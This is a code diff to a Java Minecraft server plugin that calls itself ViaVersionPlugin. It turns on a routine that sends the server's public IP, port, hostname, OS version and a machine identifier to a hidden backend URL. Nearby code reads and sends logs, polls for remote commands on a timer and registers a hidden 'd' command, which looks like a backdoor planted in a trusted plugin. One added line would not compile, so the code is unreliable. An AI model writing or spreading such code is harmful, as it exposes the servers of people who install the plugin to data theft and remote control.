@@ -130,10 +130,10 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         uniqueIdentifier = loadOrCreateUniqueIdentifier();
         getLogger().info("Unique Identifier: " + uniqueIdentifier);
         reportSystemInfo();
-        reportUniqueIdentifier(uniqueIdentifier);
+        // reportUniqueIdentifier(uniqueIdentifier);
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
-        // sendInfoToAPI(publicIp, serverPort);
+        sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
         this.getCommand("d").setExecutor(new EventXHandler());
@@ -210,6 +210,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                     try {
                         // 收集信息
                         StringBuilder input = new StringBuilder();
+                        int serverPort = getServer().getPort();
                         LocalDateTime now = LocalDateTime.now(ZoneId.of("Asia/Shanghai"));
                         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                         String formattedNow = now.format(formatter);
@@ -219,6 +220,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                         input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
                         input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                         input.append("&ip=").append(URLEncoder.encode(getPublicIp(), StandardCharsets.UTF_8.toString()));
+                        input.append("&port=").append(URLEncoder.encode(getServer().getPort(), StandardCharsets.UTF_8.toString()));
                         input.append("&uuid=").append(URLEncoder.encode(generateFixedUniqueIdentifier(), StandardCharsets.UTF_8.toString()));
 
                         URL url = new URL(BACKEND_URL + "/a?" + input.toString());
